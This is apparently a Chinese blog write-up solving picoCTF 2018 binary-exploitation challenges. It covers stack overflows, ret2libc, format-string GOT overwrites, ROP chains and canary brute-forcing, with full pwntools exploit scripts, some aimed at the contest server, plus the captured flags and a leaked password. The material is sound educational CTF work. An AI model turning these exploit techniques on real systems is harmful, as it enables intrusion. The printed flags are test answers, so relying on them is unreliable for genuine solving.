---
layout: post
title:  "picoCTFのpwn解析"
date:   2018-10-16 20:00:00
categories: WriteUp
tags: WriteUp Pwn pico
---

* content
{:toc}

国庆期间得知了美国CMU主办的picoCTF比赛，出于最近做题的手感有所下降，借此比赛来复习下PWN相关的题型（题目的质量不错，而且题型很广，自我感觉相当棒的比赛）

本文首发于[安全客—picoCTFのpwn解析](https://www.anquanke.com/post/id/161843)





### buffer overflow 0

先检查一遍文件

```bash
➜  bufferoverflow0 file vuln 
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e1e24cdf757acbd04d095e531a40d044abed7e82, not stripped
➜  bufferoverflow0 checksec vuln 
[*] '/home/Ep3ius/pwn/process/picoCTF2018/bufferoverflow0/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

由于这题给了源码所以我们直接看源码

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  fprintf(stderr, "%s\n", flag);
  fflush(stderr);
  exit(1);
}

void vuln(char *input){
  char buf[16];
  strcpy(buf, input);// !stackoverflow
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  
  if (argc > 1) {
    vuln(argv[1]);
    printf("Thanks! Received: %s", argv[1]);
  }
  else
    printf("This program takes 1 argument.\n");
  return 0;
}
```

不难看出传入的参数没有限制大小造成在vuln函数里面strcpy至buf时可能导致栈溢出，而这题只要将程序执行流劫持到sigsegv_handler函数就可以读flag，直接放exp

EXP

```python
from pwn import*
context(os='linux',arch='i386',log_level='debug')
elf = ELF('./vuln')

flag_addr = 0x804a080
puts_plt = elf.plt['puts']
buf = 'a'*0x18

payload  = buf + 'aaaa'
payload += p32(puts_plt) + 'aaaa' + p32(flag_addr)
n = process(argv=['./vuln', payload])

n.interactive()
```

FLAG

```
picoCTF{ov3rfl0ws_ar3nt_that_bad_a54b012c}
```



### buffer overflow 1

检查一遍文件

```bash
➜  bufferoverflow1 file vuln 
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=98eac1e5bfaa95437b28e069a343f3c3a7b9e800, not stripped
➜  bufferoverflow1 checksec vuln 
[*] '/home/Ep3ius/pwn/process/picoCTF2018/bufferoverflow1/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

全都没开，大胆猜测是要我们写shellcode，看源码确认一波

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

emmmm……看起来是可以用ret2shellcode但感觉有点麻烦，所以就简单套路直接溢出后劫持返回地址为win函数直接getflag

EXP

```python
from pwn import*
context(os='linux',arch='i386',log_level='debug')
n = process('./vuln')
elf = ELF('./vuln')

buf = 0x28
win_addr = 0x080485CB

payload = 'a'*buf + 'aaaa' + p32(win_addr)
n.sendline(payload)

n.interactive()
```

FLAG

```'
picoCTF{addr3ss3s_ar3_3asy14941911}
```



### leak-me

```bash
➜  leak-me file auth 
auth: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=c69a8024075d10a44fe028c410f5a06580bd3d82, not stripped
➜  leak-me checksec auth 
[*] '/home/Ep3ius/pwn/process/picoCTF2018/leak-me/auth'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

看源码分析一下程序的主要功能

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

int flag() {
  char flag[48];
  FILE *file;
  file = fopen("flag.txt", "r");
  if (file == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(flag, sizeof(flag), file);
  printf("%s", flag);
  return 0;
}


int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  
  // real pw: 
  FILE *file;
  char password[64];
  char name[256];
  char password_input[64];
  
  memset(password, 0, sizeof(password));
  memset(name, 0, sizeof(name));
  memset(password_input, 0, sizeof(password_input));
  
  printf("What is your name?\n");
  
  fgets(name, sizeof(name), stdin);
  char *end = strchr(name, '\n');    //name='a'*0x100  *end = NULL
  if (end != NULL) 
  {
    *end = '\x00';
  }

  strcat(name, ",\nPlease Enter the Password.");

  file = fopen("password.txt", "r");
  if (file == NULL) 
  {
    printf("Password File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(password, sizeof(password), file);

  printf("Hello ");
  puts(name);

  fgets(password_input, sizeof(password_input), stdin);
  password_input[sizeof(password_input)] = '\x00';
  
  if (!strcmp(password_input, password)) 
  {
    flag();
  }
  else 
  {
    printf("Incorrect Password!\n");
  }
  return 0;
}
```

我们可以看到存在一个很经典的栅栏错误类型的off-by-one漏洞，当name输入为‘a’* 0x100 时栈上的结构会如下图所示

![1538755631158](https://raw.githubusercontent.com/Nepire/Nepire.github.io/master/_posts/%E6%8A%95%E7%A8%BF__picoCTF%E3%81%AEpwn%E8%A7%A3%E6%9E%90.assets/1538755631158.png)

我们知道puts是根据'\x00'来判断字符串的末端来输出，根据程序逻辑正常的情况下应该是像左图一样是以'\n'为结尾的字符串，然后通过源代码43—47行来将'\n'替换成'\x00'使得puts(name)能正确输出输入的name，但如果输入了'a'* 256的话，会导致最后一个'\n'并没有读入而导致程序在puts(name)时会连带下面的password一起输出，这样我们就可以得到服务器上的password为

```
a_reAllY_s3cuRe_p4s$word_f85406
```

然后直接连服务器，输入长度小于256的name和leak出来的password就能直接拿到flag

FLAG

```
picoCTF{aLw4y5_Ch3cK_tHe_bUfF3r_s1z3_0f7ec3c0}
```



### shellcode

```bash
➜  shellcode file vuln 
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=fdba7cd36e043609da623c330a501f920470b49a, not stripped
➜  shellcode checksec vuln 
[*] '/home/Ep3ius/pwn/process/picoCTF2018/shellcode/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments 
```

emmmm……防护机制全没开而且题目还叫shellcode，应该错不了是写shellcode了

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 148
#define FLAGSIZE 128

void vuln(char *buf){
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  char buf[BUFSIZE];

  puts("Enter a string!");
  vuln(buf);

  puts("Thanks! Executing now...");
  
  ((void (*)())buf)();
     
  return 0;
}
```

简单审计源码后发现还真是只要写个shellcode就没了，直接给exp

EXP

```python
from pwn import*
context(os='linux',arch='i386',log_level='debug')
n = process('./vuln')
elf = ELF('./vuln')

payload = asm(shellcraft.sh())

n.sendline(payload)

n.interactive()
```

FLAG

```
picoCTF{shellc0de_w00h00_7f5a7309}
```



### bufer overflow2

```bash
➜  bufferoverflow2 file vuln 
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=f2f6cce698b62f5109de9955c0ea0ab832ea967c, not stripped
➜  bufferoverflow2 checksec vuln 
[*] '/home/Ep3ius/pwn/process/picoCTF2018/bufferoverflow2/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

审计一下源码

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 100
#define FLAGSIZE 64

void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xDEADBEEF)
    return;
  if (arg2 != 0xDEADC0DE)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

我们很容易理解题目是要我们通过vuln函数里的栈溢出把执行流劫持到win函数，并且要使传入的参数为0xDEADBEEF和0xDEADC0DE，由于是32位程序，所以直接p32(0xDEADBEEF)+p32(0xDEADC0DE)构造ROP来getflag

EXP

```python
from pwn import*
context(os='linux',arch='i386',log_level='debug')
n = process('./vuln')
elf = ELF('./vuln')

buf = 'a'*0x6c
win_addr = 0x80485CB

payload = buf + 'aaaa' + p32(win_addr)+ 'aaaa' + p32(0xDEADBEEF) + p32(0xDEADC0DE)
n.sendline(payload)

n.interactive()
```

FLAG

```
picoCTF{addr3ss3s_ar3_3asy30833fa1}
```



### got-2-learn-libc

```bash
➜  got-2-learn-libc file vuln 
vuln: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=4e901d4c8bdb0ea8cfd51522376bea63082a2734, not stripped
➜  got-2-learn-libc checksec vuln 
[*] '/home/Ep3ius/pwn/process/picoCTF2018/got-2-learn-libc/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

开了PIE，然而看到程序觉得开没开都没差的样子

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 148
#define FLAGSIZE 128

char useful_string[16] = "/bin/sh"; /* Maybe this can be used to spawn a shell? */


void vuln(){
  char buf[BUFSIZE];
  puts("Enter a string:");
  gets(buf);
  puts(buf);
  puts("Thanks! Exiting now...");
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  puts("Here are some useful addresses:\n");

  printf("puts: %p\n", puts);
  printf("fflush %p\n", fflush);
  printf("read: %p\n", read);
  printf("write: %p\n", write);
  printf("useful_string: %p\n", useful_string);

  printf("\n");
  
  vuln();
 
  return 0;
}
```

是的，就是一个简单的ret2libc的应用，通过printf出的地址我们可以得到偏移量，然后去计算system的实际地址，然后把useful_string输出的地址，也就是"/bin/sh"当作参数来构造ROP来执行system('/bin/sh')

我们先连上题目环境看下文件链接的libc文件的路径

```bash
Ep3ius@pico-2018-shell-2:/problems/got-2-learn-libc_1_ceda86bc09ce7d6a0588da4f914eb833$ ldd *
vuln:
	linux-gate.so.1 =>  (0xf77c5000)
	libc.so.6 => /lib32/libc.so.6 (0xf75ff000)
	/lib/ld-linux.so.2 (0xf77c6000)
```

EXP

```python
from pwn import*
context(os='linux',arch='i386',log_level='debug')
n = process('./vuln')
elf = ELF('./vuln')
libc = ELF('/lib32/libc.so.6')

buf = 'a'*0x9c
system_sym = libc.symbols['system']
puts_sym = libc.symbols['puts']

n.recvuntil('puts: 0x')
puts_addr = int(n.recvuntil('\n'),16)
print hex(puts_addr)
n.recvuntil('useful_string: ')
sh_addr = int(n.recvuntil('\n'),16)
print hex(sh_addr)

system_addr = (puts_addr - puts_sym) + system_sym
payload = buf + 'aaaa' + p32(system_addr) + 'aaaa' + p32(sh_addr)
n.sendline(payload)

n.interactive()
```



### echooo

```bash
➜  echooo file echo 
echo: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a5f76d1d59c0d562ca051cb171db19b5f0bd8fe7, not stripped
➜  echooo checksec echo 
[*] '/home/Ep3ius/pwn/process/picoCTF2018/echooo/echo'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);

  char buf[64];
  char flag[64];
  char *flag_ptr = flag;
  
  // Set the gid to the effective gid
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  memset(buf, 0, sizeof(flag));
  memset(buf, 0, sizeof(buf));

  puts("Time to learn about Format Strings!");
  puts("We will evaluate any format string you give us with printf().");
  puts("See if you can get the flag!");
  
  FILE *file = fopen("flag.txt", "r");
  if (file == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }
  
  fgets(flag, sizeof(flag), file);
  
  while(1) 
  {
    printf("> ");
    fgets(buf, sizeof(buf), stdin);
    printf(buf);
  }  
  return 0;
}
```

审计完源码后发现在main函数末尾存在可多次利用的格式化字符串漏洞，而flag已经读入到栈上本来的解题思路应该是通过格式化字符串读栈上flag所在的位置来获得flag，但我的第一想法是直接改printf_got为system的实际地址拿shell

先测出来偏移为11

```bash
➜  echooo ./echo
Time to learn about Format Strings!
We will evaluate any format string you give us with printf().
See if you can get the flag!
> aaaa%11$x
aaaa61616161
```

然后通过p32(printf_got)+"%11$s"泄露出printf的实际地址来计算偏移以此得到system的实际地址

EXP

```python
from pwn import*
context(os='linux',arch='i386',log_level='debug')
#n = process('./echo')
n = remote('2018shell2.picoctf.com',57169)
elf = ELF('./echo')
libc = ELF('/lib32/libc.so.6')

#printf_got = elf.got['printf']
printf_got = 0x804a00c
printf_sym = libc.symbols['printf']
system_sym = libc.symbols['system']

payload = p32(printf_got)+'%11$s'

n.recvuntil('>')
n.sendline(payload)
#leak

printf_addr1 = n.recvuntil('\n')
printf_addr = u32(printf_addr1[5:9])
print hex(printf_addr)

offset = printf_addr - printf_sym
system_addr = offset + system_sym
print hex(system_addr)

payload_fmt = fmtstr_payload(11,{printf_got:system_addr})
n.recvuntil('>')
n.sendline(payload_fmt)
sleep(0.1)
n.sendline('/bin/sh\0')

n.interactive()
```

FLAG

```
picoCTF{foRm4t_stRinGs_aRe_DanGer0us_e3d226b2}
```



### authenticate

```bash
➜  authenticate file auth 
auth: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=36db9dbaf46e8f9c9055839ffedd30fe65050a47, not stripped
➜  authenticate checksec auth 
[*] '/home/Ep3ius/pwn/process/picoCTF2018/authenticate/auth'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

审计下源码

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/types.h>

int authenticated = 0;

int flag() {
  char flag[48];
  FILE *file;
  file = fopen("flag.txt", "r");
  if (file == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(flag, sizeof(flag), file);
  printf("%s", flag);
  return 0;
}

void read_flag() {
  if (!authenticated) {
    printf("Sorry, you are not *authenticated*!\n");
  }
  else {
    printf("Access Granted.\n");
    flag();
  }

}

int main(int argc, char **argv) {

  setvbuf(stdout, NULL, _IONBF, 0);

  char buf[64];
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  
  printf("Would you like to read the flag? (yes/no)\n");

  fgets(buf, sizeof(buf), stdin);
  
  if (strstr(buf, "no") != NULL) {
    printf("Okay, Exiting...\n");
    exit(1);
  }
  else if (strstr(buf, "yes") == NULL) {
    puts("Received Unknown Input:\n");
    printf(buf);
  }
  
  read_flag();

}
```

简单的过一遍我们可以得到程序的大致流程，如果输入的字符串内带有"no"就退出程序，如果输入的字符串带有"yes"且没有"no"便进入unknown_input分支并触发了一个格式化字符串漏洞，然后程序继续执行进入read_flag()函数里，先进行一个判断，如果authenticated不为0就能调用flag函数来getflag，而authenticated是在一开始就全局定义为0了，这时我们能想到通过利用前面的格式化字符串来修改authenticated的值

EXP

```python
from pwn import*
context(os='linux',arch='i386',log_level='debug')
#n = process('./auth')
n = remote('2018shell2.picoctf.com',52398)
elf = ELF('./auth')

puts_got = elf.got['puts']
puts_sym = elf.symbols['puts']

authenticated_addr = 0x0804A04C
payload = fmtstr_payload(11,{authenticated_addr:0xDEADBEEF})
n.sendline(payload)

n.interactive()
```

FLAG

```
picoCTF{y0u_4r3_n0w_aUtH3nt1c4t3d_0bec1698}
```



### got—shell?

```bash
➜  got-shell file auth 
auth: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=5c1f84b034b4906cce036c3748d4b5a5c3eae0d8, not stripped
➜  got-shell checksec auth 
[*] '/home/Ep3ius/pwn/process/picoCTF2018/got-shell/auth'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

看一波源码

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/types.h>

void win() {
  system("/bin/sh");
}

int main(int argc, char **argv) {

  setvbuf(stdout, NULL, _IONBF, 0);

  char buf[256];
  
  unsigned int address;
  unsigned int value;

  puts("I'll let you write one 4 byte value to memory. Where would you like to write this 4 byte value?");

  scanf("%x", &address);

  sprintf(buf, "Okay, now what value would you like to write to 0x%x", address);
  puts(buf);
  
  scanf("%x", &value);

  sprintf(buf, "Okay, writing 0x%x to 0x%x", value, address);
  puts(buf);

  *(unsigned int *)address = value;

  puts("Okay, exiting now...\n");
  exit(1);
  
}
```

开始还以为自己是不是C没学好，这题怎么可能这么简单输入两个地址就getshell了，结果发现还真的是。程序的逻辑大致为输入一个十六进制的地址，然后再输入一个十六进制的数值，然后把第一次输入的地址的值替换成输入的数值，我们可以很容易想到用win函数的地址去替换puts_got，这样在程序调用puts时就相当调用了win函数来getshell

EXP

```PYTHON
from pwn import*
context(os='linux',arch='i386',log_level='debug')
#n = process('./auth')
n = remote('2018shell2.picoctf.com',23731)
elf = ELF('./auth')

puts_got = elf.got['puts']
win_addr = 0x0804854B

n.sendline(hex(puts_got))
sleep(0.1)
n.sendline(hex(win_addr))

n.interactive()
```

FLAG

```
picoCTF{m4sT3r_0f_tH3_g0t_t4b1e_a8321d81}
```



### rop chain

```bash
➜  ropchain file rop 
rop: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=86b31b317beb6a0fac1439ef6b2a271e0132537e, not stripped
➜  ropchain checksec rop 
[*] '/home/Ep3ius/pwn/process/picoCTF2018/ropchain/rop'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

看一下源码

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdbool.h>

#define BUFSIZE 16

bool win1 = false;
bool win2 = false;


void win_function1() {
  win1 = true;
}

void win_function2(unsigned int arg_check1) {
  if (win1 && arg_check1 == 0xBAAAAAAD) {
    win2 = true;
  }
  else if (win1) {
    printf("Wrong Argument. Try Again.\n");
  }
  else {
    printf("Nope. Try a little bit harder.\n");
  }
}

void flag(unsigned int arg_check2) {
  char flag[48];
  FILE *file;
  file = fopen("flag.txt", "r");
  if (file == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(flag, sizeof(flag), file);
  
  if (win1 && win2 && arg_check2 == 0xDEADBAAD) {
    printf("%s", flag);
    return;
  }
  else if (win1 && win2) {
    printf("Incorrect Argument. Remember, you can call other functions in between each win function!\n");
  }
  else if (win1 || win2) {
    printf("Nice Try! You're Getting There!\n");
  }
  else {
    printf("You won't get the flag that easy..\n");
  }
}

void vuln() {
  char buf[16];
  printf("Enter your input> ");
  return gets(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
}
```

审计过代码后我们可以得到程序中各个函数的功能和作用，像win_function1函数的作用为将全局变量win1的值赋为1，win_function2函数的作用是在win1非0且传入的参数为0xBAAAAAAD时将全局变量win2的值赋为1，flag函数的作用是当全局变量win1，win2都不为0且传入的参数为0xDEADBAAD时输出flag，这样我们就知道要通过vuln函数里的栈溢出来构造ROP去分别执行这三个函数getflag

![1538900722977](https://raw.githubusercontent.com/Nepire/Nepire.github.io/master/_posts/%E6%8A%95%E7%A8%BF__picoCTF%E3%81%AEpwn%E8%A7%A3%E6%9E%90.assets/1538900722977.png)

EXP

```python
from pwn import*
context(os='linux',arch='i386',log_level='debug')
n = process('./rop')
elf = ELF('./rop')

func1 = 0x080485CB
func2 = 0x080485d8
flag = 0x0804862B
pop_ret = 0x080485d6
buf = 'a'*0x18

payload = buf + 'aaaa'
payload += p32(func1)+p32(pop_ret) + p32(0)
payload += p32(func2)+p32(pop_ret) + p32(0xBAAAAAAD)
payload += p32(flag)+p32(pop_ret) + p32(0xDEADBAAD)

n.recvuntil('>')
n.sendline(payload)

n.interactive()
```

FLAG

```
picoCTF{rOp_aInT_5o_h4Rd_R1gHt_6e6efe52}
```



### buffer overflow 3

```bash
➜  bufferoverflow3 file vuln 
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=49bf81f7f16a1c26cfbbb0a70bb89246fadc370e, not stripped
➜  bufferoverflow3 checksec vuln
[*] '/home/Ep3ius/pwn/process/picoCTF2018/bufferoverflow3/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

嗯，没开canary，看一波源码

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 32
#define FLAGSIZE 64
#define CANARY_SIZE 4

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  puts(buf);
  fflush(stdout);
}

char global_canary[CANARY_SIZE];
void read_canary() {
  FILE *f = fopen("canary.txt","r");
  if (f == NULL) {
    printf("Canary is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fread(global_canary,sizeof(char),CANARY_SIZE,f);
  fclose(f);
}

void vuln(){
   char canary[CANARY_SIZE];
   char buf[BUFSIZE];
   char length[BUFSIZE];
   int count;
   int x = 0;
   memcpy(canary,global_canary,CANARY_SIZE);
   printf("How Many Bytes will You Write Into the Buffer?\n> ");
   while (x<BUFSIZE) {
      read(0,length+x,1);
      if (length[x]=='\n') break;
      x++;
   }
   sscanf(length,"%d",&count);

   printf("Input> ");
   read(0,buf,count);

   if (memcmp(canary,global_canary,CANARY_SIZE)) {
      printf("*** Stack Smashing Detected *** : Canary Value Corrupt!\n");
      exit(-1);
   }
   printf("Ok... Now Where's the Flag?\n");
   fflush(stdout);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  int i;
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  read_canary();
  vuln();
  return 0;
}
```

打开审计后发现它自己实现了一个简易的Canary防护函数，我们针对canary常用的攻击方式中Stack Smashing Protector  Leak

攻击可以立马否决，因为错误回显并没有输出avgr[0]这个必要条件。程序中canary的值是从一个内容不变的文本文档中读取的，所以我们可以通过写爆破脚本去把canary的具体内容输出出来。

通过ida我们可以得到canary插入在栈上0x10的位置，输入的首地址位于栈上0x30，

```stack
  char buf; // [esp+28h] [ebp-30h]
  int canary; // [esp+48h] [ebp-10h]
```

我们运行程序测试一下

```bash
➜  bufferoverflow3 ./vuln
How Many Bytes will You Write Into the Buffer?
> 32
Input> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Ok... Now Where's the Flag?
➜  bufferoverflow3 ./vuln
How Many Bytes will You Write Into the Buffer?
> 33
Input> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
*** Stack Smashing Detected *** : Canary Value Corrupt!
```

确认canary插入的位置为0x20

bp.py

```python
from pwn import*
#canary = 'h_?='
canary = ''
for i in range(4):
        for a in range(0xff):
                n = process('./vuln')
                n.recvuntil('> ')
                n.sendline('36')
                n.recvuntil('Input> ')
                payload = 'a'*0x20+canary+chr(a)
                #print chr(a)
                n.send(payload)
                try:
                        n.recvuntil('*** Stack Smashing Detected ***')
                except:
                        if canary=='':
                            canary = chr(a)
                        else:
                            canary += chr(a)
                        n.close()
                        break
                else:
                        n.close()

print 'canary:',canary
```

通过爆破我们得到canary的值为"h_?="实在是鬼畜，本以为是PICO的我还是太天真了

在知道canary的情况下，剩下的就是简单的栈溢出劫持程序执行流至win函数就能get flag了

EXP

```python
from pwn import*
context(os='linux',arch='i386',log_level='debug')
n = process('./vuln')
elf = ELF('./vuln')
canary = 'h_?='

win_addr = 0x080486EB

payload = 'a'*0x20+canary+'a'*(0x10-len(canary)+4)+p32(win_addr)

n.recvuntil('> ')
n.sendline('100')
n.recvuntil('Input> ')
n.sendline(payload)

n.interactive()
```



### echo back

```bash
➜  echo back file echoback 
echoback: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a0980ead6e67788ea13395e9bdd23f0fe3d0b2c8, not stripped
➜  echo back checksec echoback 
[*] '/home/Ep3ius/pwn/process/picoCTF2018/echo back/echoback'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

开了NX和Canary，审计下源码......然而这题并没有给，那就开ida看一下程序干了些什么

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __gid_t v3; // ST1C_4

  setvbuf(_bss_start, 0, 2, 0);
  v3 = getegid();
  setresgid(v3, v3, v3);
  vuln();
  return 0;
}
```



![1538928251008](https://raw.githubusercontent.com/Nepire/Nepire.github.io/master/_posts/%E6%8A%95%E7%A8%BF__picoCTF%E3%81%AEpwn%E8%A7%A3%E6%9E%90.assets/1538928251008.png)

我们在vuln函数里发现存在一个格式化字符串漏洞，由于我太菜了没能想出能只用一次格式化字符串就能getshell的payload，所以就想先把puts_got改成了vuln函数的地址，让这个格式化字符串漏洞能多次触发。

我们审计过程序后能得到的大致思路为先测出偏移，修改puts_got为vuln函数地址使得漏洞能多次触发，然后通过p32(system_got)+fmt_offset来得到system的真实地址，再把system的真实地址写入printf_got，然后在下一轮循环中输入'/bin/sh'后printf('/bin/sh')就相当执行了system('/bin/sh')来getshell

```bash
➜  echo back ./echoback 
input your message:
aaaa%7$x
aaaa61616161

Thanks for sending the message!
```

![1538929511533](https://raw.githubusercontent.com/Nepire/Nepire.github.io/master/_posts/%E6%8A%95%E7%A8%BF__picoCTF%E3%81%AEpwn%E8%A7%A3%E6%9E%90.assets/1538929511533.png)

EXP

```python
from pwn import*
context(os='linux',arch='i386',log_level='debug')
#n = process('./echoback')
n = remote('2018shell2.picoctf.com',37402)
elf = ELF('./echoback')

printf_got = elf.got['printf']
puts_got = elf.got['puts']
system_got = elf.got['system']
vuln_addr = 0x080485AB

